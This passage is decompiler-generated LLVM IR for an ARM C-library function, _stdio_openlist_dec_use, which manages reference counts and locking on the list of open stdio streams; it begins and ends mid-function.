  uselistorder i32 %arg3, { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_14f24, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_14efc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14ee4, { 1, 0 }
  uselistorder label %dec_label_pc_14e94, { 1, 0 }
  uselistorder label %dec_label_pc_14e88, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_14e78, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14e60, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_14f30 = load i32, i32* @r4, align 4
  store i32 %v3_14f30, i32* %stack_var_-20, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* %r5.global-to-local, align 4
  %v4_14f40 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 160) to i32*), align 4
  store i32 %v4_14f40, i32* %r7.global-to-local, align 4
  %v0_14f44 = call i32 @__aeabi_read_tp()
  store i32 %v0_14f44, i32* %r0.global-to-local, align 4
  %v1_14f48 = add i32 %v4_14f40, 8
  %v2_14f48 = inttoptr i32 %v1_14f48 to i32*
  %v3_14f48 = load i32, i32* %v2_14f48, align 4
  store i32 %v3_14f48, i32* %r3.global-to-local, align 4
  %v1_14f4c = add i32 %v0_14f44, -1168
  store i32 %v1_14f4c, i32* %r6.global-to-local, align 4
  %v3_14f50 = icmp uge i32 %v3_14f48, %v1_14f4c
  store i1 %v3_14f50, i1* %cpsr_c.global-to-local, align 1
  %v9_14f50 = icmp eq i32 %v3_14f48, %v1_14f4c
  br i1 %v9_14f50, label %dec_label_pc_14f9c, label %dec_label_pc_14f5c

dec_label_pc_14f5c:                               ; preds = %entry
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_14f40, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_14f6893 = inttoptr i32 %v4_14f40 to i32*
  %v2_14f6894 = load i32, i32* %v1_14f6893, align 4
  store i32 %v2_14f6894, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_14f6c96 = icmp eq i32 %v2_14f6894, 0
  br i1 %v9_14f6c96, label %dec_label_pc_14f74, label %dec_label_pc_14f8c

dec_label_pc_14f74:                               ; preds = %dec_label_pc_14f5c, %dec_label_pc_14f74.dec_label_pc_14f68_crit_edge
  %v0_14f7497 = phi i32 [ %v1_14f6c.pre, %dec_label_pc_14f74.dec_label_pc_14f68_crit_edge ], [ 0, %dec_label_pc_14f5c ]
  store i32 %v0_14f7497, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14f84 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14f84, label %dec_label_pc_14f88, label %dec_label_pc_14f74.dec_label_pc_14f68_crit_edge

dec_label_pc_14f74.dec_label_pc_14f68_crit_edge:  ; preds = %dec_label_pc_14f74
  %v0_14f68.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14f6c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14f68 = inttoptr i32 %v0_14f68.pre to i32*
  %v2_14f68 = load i32, i32* %v1_14f68, align 4
  store i32 %v2_14f68, i32* %r3.global-to-local, align 4
  %v3_14f6c = icmp uge i32 %v2_14f68, %v1_14f6c.pre
  store i1 %v3_14f6c, i1* %cpsr_c.global-to-local, align 1
  %v9_14f6c = icmp eq i32 %v2_14f68, %v1_14f6c.pre
  br i1 %v9_14f6c, label %dec_label_pc_14f74, label %dec_label_pc_14f8c

dec_label_pc_14f88:                               ; preds = %dec_label_pc_14f74
  %v0_14f88 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14f88, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14f8c

dec_label_pc_14f8c:                               ; preds = %dec_label_pc_14f5c, %dec_label_pc_14f74.dec_label_pc_14f68_crit_edge, %dec_label_pc_14f88
  %v0_14f8c = phi i32 [ %v0_14f88, %dec_label_pc_14f88 ], [ %v2_14f6894, %dec_label_pc_14f5c ], [ %v2_14f68, %dec_label_pc_14f74.dec_label_pc_14f68_crit_edge ]
  %v1_14f8c = phi i32 [ %v0_14f88, %dec_label_pc_14f88 ], [ 0, %dec_label_pc_14f5c ], [ %v1_14f6c.pre, %dec_label_pc_14f74.dec_label_pc_14f68_crit_edge ]
  %v3_14f8c = icmp uge i32 %v0_14f8c, %v1_14f8c
  store i1 %v3_14f8c, i1* %cpsr_c.global-to-local, align 1
  %v9_14f8c = icmp eq i32 %v0_14f8c, %v1_14f8c
  br i1 %v9_14f8c, label %bb45, label %bb

bb:                                               ; preds = %dec_label_pc_14f8c
  %v1_14f90 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_14f90, i32* %r0.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_14f8c, %bb
  %v1_14f94 = xor i1 %v9_14f8c, true
  call void @__pseudo_cond_branch(i1 %v1_14f94, i32 ptrtoint (i32* @global_var_12a60.740 to i32))
  %v0_14f98 = load i32, i32* %r6.global-to-local, align 4
  %v1_14f98 = load i32, i32* %r7.global-to-local, align 4
  %v2_14f98 = add i32 %v1_14f98, 8
  %v3_14f98 = inttoptr i32 %v2_14f98 to i32*
  store i32 %v0_14f98, i32* %v3_14f98, align 4
  br label %dec_label_pc_14f9c

dec_label_pc_14f9c:                               ; preds = %entry, %bb45
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_14fa0 = load i32, i32* %r5.global-to-local, align 4
  %v2_14fa0 = add i32 %v0_14fa0, 160
  %v3_14fa0 = inttoptr i32 %v2_14fa0 to i32*
  %v4_14fa0 = load i32, i32* %v3_14fa0, align 4
  store i32 %v4_14fa0, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_14fa8 = add i32 %v0_14fa0, 12
  %v3_14fa8 = inttoptr i32 %v2_14fa8 to i32*
  %v4_14fa8 = load i32, i32* %v3_14fa8, align 4
  store i32 %v4_14fa8, i32* %r3.global-to-local, align 4
  %v1_14fac = inttoptr i32 %v4_14fa8 to i32*
  %v2_14fac = load i32, i32* %v1_14fac, align 4
  store i32 %v2_14fac, i32* %r1.global-to-local, align 4
  %v1_14fb0 = add i32 %v4_14fa0, 4
  %v2_14fb0 = inttoptr i32 %v1_14fb0 to i32*
  %v3_14fb0 = load i32, i32* %v2_14fb0, align 4
  %v2_14fb4 = icmp ne i32 %v2_14fac, 0
  store i1 %v2_14fb4, i1* %cpsr_c.global-to-local, align 1
  %v7_14fb4 = icmp eq i32 %v2_14fac, 1
  %v1_14fb8 = add i32 %v3_14fb0, 1
  store i32 %v1_14fb8, i32* %r3.global-to-local, align 4
  store i32 %v1_14fb8, i32* %v2_14fb0, align 4
  br i1 %v7_14fb4, label %dec_label_pc_14fc4, label %dec_label_pc_15128

dec_label_pc_14fc4:                               ; preds = %dec_label_pc_14f9c
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_14fc8 = load i32, i32* %r5.global-to-local, align 4
  %v2_14fc8 = add i32 %v0_14fc8, 80
  %v3_14fc8 = inttoptr i32 %v2_14fc8 to i32*
  %v4_14fc8 = load i32, i32* %v3_14fc8, align 4
  store i32 %v4_14fc8, i32* %r3.global-to-local, align 4
  %v1_14fcc = inttoptr i32 %v4_14fc8 to i32*
  %v2_14fcc = load i32, i32* %v1_14fcc, align 4
  store i32 %v2_14fcc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp46 = icmp slt i32 %v2_14fcc, 1
  br i1 %tmp46, label %dec_label_pc_15128, label %dec_label_pc_14fd8

dec_label_pc_14fd8:                               ; preds = %dec_label_pc_14fc4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_14fdc = add i32 %v0_14fc8, 152
  %v3_14fdc = inttoptr i32 %v2_14fdc to i32*
  %v4_14fdc = load i32, i32* %v3_14fdc, align 4
  store i32 %v4_14fdc, i32* %r7.global-to-local, align 4
  %v1_14fe0 = add i32 %v4_14fdc, 8
  %v2_14fe0 = inttoptr i32 %v1_14fe0 to i32*
  %v3_14fe0 = load i32, i32* %v2_14fe0, align 4
  store i32 %v3_14fe0, i32* %r3.global-to-local, align 4
  %v1_14fe4 = load i32, i32* %r6.global-to-local, align 4
  %v3_14fe4 = icmp uge i32 %v3_14fe0, %v1_14fe4
  store i1 %v3_14fe4, i1* %cpsr_c.global-to-local, align 1
  %v9_14fe4 = icmp eq i32 %v3_14fe0, %v1_14fe4
  br i1 %v9_14fe4, label %dec_label_pc_15028, label %dec_label_pc_14fec

dec_label_pc_14fec:                               ; preds = %dec_label_pc_14fd8
  store i32 %v4_14fdc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_14ff486 = inttoptr i32 %v4_14fdc to i32*
  %v2_14ff487 = load i32, i32* %v1_14ff486, align 4
  store i32 %v2_14ff487, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_14ff889 = icmp eq i32 %v2_14ff487, 0
  br i1 %v9_14ff889, label %dec_label_pc_15000, label %dec_label_pc_15018

dec_label_pc_15000:                               ; preds = %dec_label_pc_14fec, %dec_label_pc_15000.dec_label_pc_14ff4_crit_edge
  %v0_1500090 = phi i32 [ %v1_14ff8.pre, %dec_label_pc_15000.dec_label_pc_14ff4_crit_edge ], [ 0, %dec_label_pc_14fec ]
  store i32 %v0_1500090, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15010 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15010, label %dec_label_pc_15014, label %dec_label_pc_15000.dec_label_pc_14ff4_crit_edge

dec_label_pc_15000.dec_label_pc_14ff4_crit_edge:  ; preds = %dec_label_pc_15000
  %v0_14ff4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14ff8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14ff4 = inttoptr i32 %v0_14ff4.pre to i32*
  %v2_14ff4 = load i32, i32* %v1_14ff4, align 4
  store i32 %v2_14ff4, i32* %r3.global-to-local, align 4
  %v3_14ff8 = icmp uge i32 %v2_14ff4, %v1_14ff8.pre
  store i1 %v3_14ff8, i1* %cpsr_c.global-to-local, align 1
  %v9_14ff8 = icmp eq i32 %v2_14ff4, %v1_14ff8.pre
  br i1 %v9_14ff8, label %dec_label_pc_15000, label %dec_label_pc_15018

dec_label_pc_15014:                               ; preds = %dec_label_pc_15000
  %v0_15014 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15014, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15018

dec_label_pc_15018:                               ; preds = %dec_label_pc_14fec, %dec_label_pc_15000.dec_label_pc_14ff4_crit_edge, %dec_label_pc_15014
  %v0_15018 = phi i32 [ %v0_15014, %dec_label_pc_15014 ], [ %v2_14ff487, %dec_label_pc_14fec ], [ %v2_14ff4, %dec_label_pc_15000.dec_label_pc_14ff4_crit_edge ]
  %v1_15018 = phi i32 [ %v0_15014, %dec_label_pc_15014 ], [ 0, %dec_label_pc_14fec ], [ %v1_14ff8.pre, %dec_label_pc_15000.dec_label_pc_14ff4_crit_edge ]
  %v3_15018 = icmp uge i32 %v0_15018, %v1_15018
  store i1 %v3_15018, i1* %cpsr_c.global-to-local, align 1
  %v9_15018 = icmp eq i32 %v0_15018, %v1_15018
  br i1 %v9_15018, label %bb48, label %bb47

bb47:                                             ; preds = %dec_label_pc_15018
  %v1_1501c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_1501c, i32* %r0.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_15018, %bb47
  %v1_15020 = xor i1 %v9_15018, true
  call void @__pseudo_cond_branch(i1 %v1_15020, i32 ptrtoint (i32* @global_var_12a60.740 to i32))
  %v0_15024 = load i32, i32* %r6.global-to-local, align 4
  %v1_15024 = load i32, i32* %r7.global-to-local, align 4
  %v2_15024 = add i32 %v1_15024, 8
  %v3_15024 = inttoptr i32 %v2_15024 to i32*
  store i32 %v0_15024, i32* %v3_15024, align 4
  %v0_15030.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15028

dec_label_pc_15028:                               ; preds = %dec_label_pc_14fd8, %bb48
  %v0_15030 = phi i32 [ %v0_14fc8, %dec_label_pc_14fd8 ], [ %v0_15030.pre, %bb48 ]
  store i32 152, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r1.global-to-local, align 4
  %v2_15030 = add i32 %v0_15030, 152
  %v3_15030 = inttoptr i32 %v2_15030 to i32*
  %v4_15030 = load i32, i32* %v3_15030, align 4
  store i32 %v4_15030, i32* %r0.global-to-local, align 4
  %v2_15034 = add i32 %v0_15030, 76
  %v3_15034 = inttoptr i32 %v2_15034 to i32*
  %v4_15034 = load i32, i32* %v3_15034, align 4
  store i32 %v4_15034, i32* %r2.global-to-local, align 4
  %v1_15038 = add i32 %v4_15030, 4
  %v2_15038 = inttoptr i32 %v1_15038 to i32*
  %v3_15038 = load i32, i32* %v2_15038, align 4
  store i32 %v3_15038, i32* %r3.global-to-local, align 4
  %v1_1503c = inttoptr i32 %v4_15034 to i32*
  %v2_1503c = load i32, i32* %v1_1503c, align 4
  store i32 %v2_1503c, i32* %r2.global-to-local, align 4
  %v1_15040 = add i32 %v3_15038, 1
  store i32 %v1_15040, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v1_15040, i32* %v2_15038, align 4
  %v0_15090.pr = load i32, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1509011 = icmp eq i32 %v0_15090.pr, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_1509011, label %dec_label_pc_1509c, label %dec_label_pc_15054

dec_label_pc_15054:                               ; preds = %dec_label_pc_15028, %dec_label_pc_1508c
  %v0_150782 = phi i32 [ %v0_1508c, %dec_label_pc_1508c ], [ %v0_15090.pr, %dec_label_pc_15028 ]
  %v1_15054 = inttoptr i32 %v0_150782 to i16*
  %v2_15054 = load i16, i16* %v1_15054, align 2
  %v3_15054 = zext i16 %v2_15054 to i32
  store i32 %v3_15054, i32* %r3.global-to-local, align 4
  %v2_15058 = and i32 %v3_15054, 32816
  store i32 %v2_15058, i32* %r1.global-to-local, align 4
  %v2_1505c = icmp ugt i32 %v2_15058, 47
  store i1 %v2_1505c, i1* %cpsr_c.global-to-local, align 1
  %v7_1505c = icmp eq i32 %v2_15058, 48
  %v1_15060 = add i32 %v0_150782, 32
  %v2_15060 = inttoptr i32 %v1_15060 to i32*
  %v3_15060 = load i32, i32* %v2_15060, align 4
  store i32 %v3_15060, i32* %r4.global-to-local, align 4
  br i1 %v7_1505c, label %dec_label_pc_1506c, label %.thread38

.thread38:                                        ; preds = %dec_label_pc_15054
  store i32 %v0_150782, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1508c

dec_label_pc_1506c:                               ; preds = %dec_label_pc_15054
  %v0_1506c = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1506c = icmp eq i32 %v0_1506c, 0
  br i1 %v2_1506c, label %.thread, label %bb49

.thread:                                          ; preds = %dec_label_pc_1506c
  %v1_15070 = load i32, i32* %r5.global-to-local, align 4
  %v2_15070 = load i32, i32* %r7.global-to-local, align 4
  %v3_15070 = add i32 %v2_15070, %v1_15070
  %v4_15070 = inttoptr i32 %v3_15070 to i32*
  %v5_15070 = load i32, i32* %v4_15070, align 4
  store i32 %v5_15070, i32* %r3.global-to-local, align 4
  %v3_15074 = inttoptr i32 %v5_15070 to i32*
  store i32 %v3_15060, i32* %v3_15074, align 4
  %v0_15078 = load i32, i32* %r2.global-to-local, align 4
  %v1_15078 = inttoptr i32 %v0_15078 to i16*
  %v2_15078 = load i16, i16* %v1_15078, align 2
  %v3_15078 = zext i16 %v2_15078 to i32
  store i32 %v3_15078, i32* %r3.global-to-local, align 4
  br label %bb50

bb49:                                             ; preds = %dec_label_pc_1506c
  %v2_150788 = load i16, i16* %v1_15054, align 2
  %v3_150789 = zext i16 %v2_150788 to i32
  store i32 %v3_150789, i32* %r3.global-to-local, align 4
  %v3_1507c = add i32 %v0_1506c, 32
  %v4_1507c = inttoptr i32 %v3_1507c to i32*
  store i32 %v3_15060, i32* %v4_1507c, align 4
  %v0_15080.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %.thread, %bb49
  %v0_15080 = phi i32 [ %v3_15078, %.thread ], [ %v0_15080.pre, %bb49 ]
  %v1_15080 = and i32 %v0_15080, 8192
  %v2_15080 = icmp eq i32 %v1_15080, 0
  br i1 %v2_15080, label %bb52, label %bb51

bb51:                                             ; preds = %bb50
  %v1_15084 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_15084, i32* %r0.global-to-local, align 4
  br label %bb52

bb52:                                             ; preds = %bb50, %bb51
  %v1_15088 = xor i1 %v2_15080, true
  call void @__pseudo_cond_branch(i1 %v1_15088, i32 ptrtoint (i32* @global_var_11abc.29 to i32))
  %v0_1508c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1508c

dec_label_pc_1508c:                               ; preds = %.thread38, %bb52
  %v0_1508c = phi i32 [ %v0_1508c.pre, %bb52 ], [ %v3_15060, %.thread38 ]
  store i32 %v0_1508c, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15090 = icmp eq i32 %v0_1508c, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_15090, label %dec_label_pc_1509c, label %dec_label_pc_15054

dec_label_pc_1509c:                               ; preds = %dec_label_pc_1508c, %dec_label_pc_15028
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_150a0 = load i32, i32* %r5.global-to-local, align 4
  %v2_150a0 = add i32 %v0_150a0, 152
  %v3_150a0 = inttoptr i32 %v2_150a0 to i32*
  %v4_150a0 = load i32, i32* %v3_150a0, align 4
  store i32 %v4_150a0, i32* %r0.global-to-local, align 4
  %v1_150a4 = add i32 %v4_150a0, 4
  %v2_150a4 = inttoptr i32 %v1_150a4 to i32*
  %v3_150a4 = load i32, i32* %v2_150a4, align 4
  %v1_150a8 = add i32 %v3_150a4, -1
  store i32 %v1_150a8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_150ac = icmp eq i32 %v1_150a8, 0
  store i32 %v1_150a8, i32* %v2_150a4, align 4
  br i1 %v2_150ac, label %dec_label_pc_150b8, label %dec_label_pc_15118

dec_label_pc_150b8:                               ; preds = %dec_label_pc_1509c
  %v0_150b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_150b8 = load i32, i32* %r0.global-to-local, align 4
  %v2_150b8 = add i32 %v1_150b8, 8
  %v3_150b8 = inttoptr i32 %v2_150b8 to i32*
  store i32 %v0_150b8, i32* %v3_150b8, align 4
  %v0_150bc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_150bc, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_150c0

dec_label_pc_150c0:                               ; preds = %dec_label_pc_150f0.dec_label_pc_150c0_crit_edge, %dec_label_pc_150b8
  %v0_150c0 = phi i32 [ %v0_150c0.pre, %dec_label_pc_150f0.dec_label_pc_150c0_crit_edge ], [ %v0_150bc, %dec_label_pc_150b8 ]
  %v1_150c0 = inttoptr i32 %v0_150c0 to i32*
  %v2_150c0 = load i32, i32* %v1_150c0, align 4
  store i32 %v2_150c0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_150c0, i32* %r2.global-to-local, align 4
  %v2_150cc74 = load i32, i32* %v1_150c0, align 4
  store i32 %v2_150cc74, i32* %r3.global-to-local, align 4
  %v3_150d076 = icmp uge i32 %v2_150cc74, %v2_150c0
  store i1 %v3_150d076, i1* %cpsr_c.global-to-local, align 1
  %v9_150d082 = icmp eq i32 %v2_150cc74, %v2_150c0
  br i1 %v9_150d082, label %dec_label_pc_150d8, label %dec_label_pc_150f0

dec_label_pc_150d8:                               ; preds = %dec_label_pc_150c0, %dec_label_pc_150d8.dec_label_pc_150cc_crit_edge
  %v0_150d883 = phi i32 [ %v1_150d0.pre, %dec_label_pc_150d8.dec_label_pc_150cc_crit_edge ], [ %v2_150c0, %dec_label_pc_150c0 ]
  store i32 %v0_150d883, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_150e8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_150e8, label %dec_label_pc_150ec, label %dec_label_pc_150d8.dec_label_pc_150cc_crit_edge

dec_label_pc_150d8.dec_label_pc_150cc_crit_edge:  ; preds = %dec_label_pc_150d8
  %v0_150cc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_150d0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_150cc = inttoptr i32 %v0_150cc.pre to i32*
  %v2_150cc = load i32, i32* %v1_150cc, align 4
  store i32 %v2_150cc, i32* %r3.global-to-local, align 4
  %v3_150d0 = icmp uge i32 %v2_150cc, %v1_150d0.pre
  store i1 %v3_150d0, i1* %cpsr_c.global-to-local, align 1
  %v9_150d0 = icmp eq i32 %v2_150cc, %v1_150d0.pre
  br i1 %v9_150d0, label %dec_label_pc_150d8, label %dec_label_pc_150f0

dec_label_pc_150ec:                               ; preds = %dec_label_pc_150d8
  %v0_150ec = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_150ec, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_150f0

dec_label_pc_150f0:                               ; preds = %dec_label_pc_150c0, %dec_label_pc_150d8.dec_label_pc_150cc_crit_edge, %dec_label_pc_150ec
  %v0_150f8 = phi i32 [ %v0_150ec, %dec_label_pc_150ec ], [ %v2_150cc74, %dec_label_pc_150c0 ], [ %v2_150cc, %dec_label_pc_150d8.dec_label_pc_150cc_crit_edge ]
  %v1_150f0 = phi i32 [ %v0_150ec, %dec_label_pc_150ec ], [ %v2_150c0, %dec_label_pc_150c0 ], [ %v1_150d0.pre, %dec_label_pc_150d8.dec_label_pc_150cc_crit_edge ]
  %v3_150f0 = icmp uge i32 %v0_150f8, %v1_150f0
  store i1 %v3_150f0, i1* %cpsr_c.global-to-local, align 1
  %v9_150f0 = icmp eq i32 %v0_150f8, %v1_150f0
  br i1 %v9_150f0, label %dec_label_pc_150f8, label %dec_label_pc_150f0.dec_label_pc_150c0_crit_edge

dec_label_pc_150f0.dec_label_pc_150c0_crit_edge:  ; preds = %dec_label_pc_150f0
  %v0_150c0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_150c0

dec_label_pc_150f8:                               ; preds = %dec_label_pc_150f0
  %v2_150f8 = icmp ne i32 %v1_150f0, 0
  store i1 %v2_150f8, i1* %cpsr_c.global-to-local, align 1
  %v7_150fc = icmp slt i32 %v1_150f0, 2
  br i1 %v7_150fc, label %dec_label_pc_15118, label %dec_label_pc_15100

dec_label_pc_15100:                               ; preds = %dec_label_pc_150f8
  %v0_15100 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_15100, i32* %r0.global-to-local, align 4
  %v0_15104 = load i32, i32* %r1.global-to-local, align 4
  %v1_15104 = add i32 %v0_15104, 129
  store i32 %v1_15104, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15118

dec_label_pc_15118:                               ; preds = %dec_label_pc_1509c, %dec_label_pc_15100, %dec_label_pc_150f8
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_1511c = load i32, i32* %r5.global-to-local, align 4
  %v2_1511c = add i32 %v0_1511c, 80
  %v3_1511c = inttoptr i32 %v2_1511c to i32*
  %v4_1511c = load i32, i32* %v3_1511c, align 4
  store i32 %v4_1511c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_15124 = inttoptr i32 %v4_1511c to i32*
  store i32 0, i32* %v2_15124, align 4
  br label %dec_label_pc_15128

dec_label_pc_15128:                               ; preds = %dec_label_pc_14f9c, %dec_label_pc_14fc4, %dec_label_pc_15118
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_1512c = load i32, i32* %r5.global-to-local, align 4
  %v2_1512c = add i32 %v0_1512c, 160
  %v3_1512c = inttoptr i32 %v2_1512c to i32*
  %v4_1512c = load i32, i32* %v3_1512c, align 4
  store i32 %v4_1512c, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_15134 = add i32 %v0_1512c, 12
  %v3_15134 = inttoptr i32 %v2_15134 to i32*
  %v4_15134 = load i32, i32* %v3_15134, align 4
  store i32 %v4_15134, i32* %r1.global-to-local, align 4
  %v1_15138 = add i32 %v4_1512c, 4
  %v2_15138 = inttoptr i32 %v1_15138 to i32*
  %v3_15138 = load i32, i32* %v2_15138, align 4
  store i32 %v3_15138, i32* %r2.global-to-local, align 4
  %v1_1513c = inttoptr i32 %v4_15134 to i32*
  %v2_1513c = load i32, i32* %v1_1513c, align 4
  %v1_15140 = add i32 %v3_15138, -1
  store i32 %v1_15140, i32* %r2.global-to-local, align 4
  %v1_15144 = add i32 %v2_1513c, -1
  store i32 %v1_15144, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15148 = icmp eq i32 %v1_15140, 0
  store i32 %v1_15144, i32* %v1_1513c, align 4
  %v0_15150 = load i32, i32* %r2.global-to-local, align 4
  %v1_15150 = load i32, i32* %r0.global-to-local, align 4
  %v2_15150 = add i32 %v1_15150, 4
  %v3_15150 = inttoptr i32 %v2_15150 to i32*
  store i32 %v0_15150, i32* %v3_15150, align 4
  br i1 %v2_15148, label %dec_label_pc_15158, label %dec_label_pc_151b8

dec_label_pc_15158:                               ; preds = %dec_label_pc_15128
  %v0_15158 = load i32, i32* %r2.global-to-local, align 4
  %v1_15158 = load i32, i32* %r0.global-to-local, align 4
  %v2_15158 = add i32 %v1_15158, 8
  %v3_15158 = inttoptr i32 %v2_15158 to i32*
  store i32 %v0_15158, i32* %v3_15158, align 4
  %v0_1515c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1515c, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15160

dec_label_pc_15160:                               ; preds = %dec_label_pc_15190.dec_label_pc_15160_crit_edge, %dec_label_pc_15158
  %v0_15160 = phi i32 [ %v0_15160.pre, %dec_label_pc_15190.dec_label_pc_15160_crit_edge ], [ %v0_1515c, %dec_label_pc_15158 ]
  %v1_15160 = inttoptr i32 %v0_15160 to i32*
  %v2_15160 = load i32, i32* %v1_15160, align 4
  store i32 %v2_15160, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_15160, i32* %r2.global-to-local, align 4
  %v2_1516c62 = load i32, i32* %v1_15160, align 4
  store i32 %v2_1516c62, i32* %r3.global-to-local, align 4
  %v3_1517064 = icmp uge i32 %v2_1516c62, %v2_15160
  store i1 %v3_1517064, i1* %cpsr_c.global-to-local, align 1
  %v9_1517070 = icmp eq i32 %v2_1516c62, %v2_15160
  br i1 %v9_1517070, label %dec_label_pc_15178, label %dec_label_pc_15190

dec_label_pc_15178:                               ; preds = %dec_label_pc_15160, %dec_label_pc_15178.dec_label_pc_1516c_crit_edge
  %v0_1517871 = phi i32 [ %v1_15170.pre, %dec_label_pc_15178.dec_label_pc_1516c_crit_edge ], [ %v2_15160, %dec_label_pc_15160 ]
  store i32 %v0_1517871, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15188 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15188, label %dec_label_pc_1518c, label %dec_label_pc_15178.dec_label_pc_1516c_crit_edge

dec_label_pc_15178.dec_label_pc_1516c_crit_edge:  ; preds = %dec_label_pc_15178
  %v0_1516c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15170.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1516c = inttoptr i32 %v0_1516c.pre to i32*
  %v2_1516c = load i32, i32* %v1_1516c, align 4
  store i32 %v2_1516c, i32* %r3.global-to-local, align 4
  %v3_15170 = icmp uge i32 %v2_1516c, %v1_15170.pre
  store i1 %v3_15170, i1* %cpsr_c.global-to-local, align 1
  %v9_15170 = icmp eq i32 %v2_1516c, %v1_15170.pre
  br i1 %v9_15170, label %dec_label_pc_15178, label %dec_label_pc_15190

dec_label_pc_1518c:                               ; preds = %dec_label_pc_15178
  %v0_1518c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1518c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15190

